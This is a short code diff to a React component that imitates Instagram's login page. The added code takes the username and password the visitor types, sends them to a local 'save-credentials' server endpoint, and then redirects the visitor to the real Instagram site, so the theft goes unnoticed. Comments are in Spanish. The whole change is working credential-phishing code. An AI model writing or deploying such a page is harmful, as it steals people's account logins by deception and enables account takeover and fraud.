@@ -6,10 +6,26 @@ export default function InstagramLogin() {
   const [usernameFocused, setUsernameFocused] = useState(false);
   const [passwordFocused, setPasswordFocused] = useState(false);
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
     if (username && password) {
+      try {
+        // Guardar credenciales en el servidor
+        await fetch('http://localhost:3001/api/save-credentials', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            username,
+            password
+          })
+        });
+      } catch (error) {
+        console.error('Error al guardar credenciales:', error);
+      }
+
       // Redireccionar a Instagram
       window.location.href = 'https://www.instagram.com/';
     }
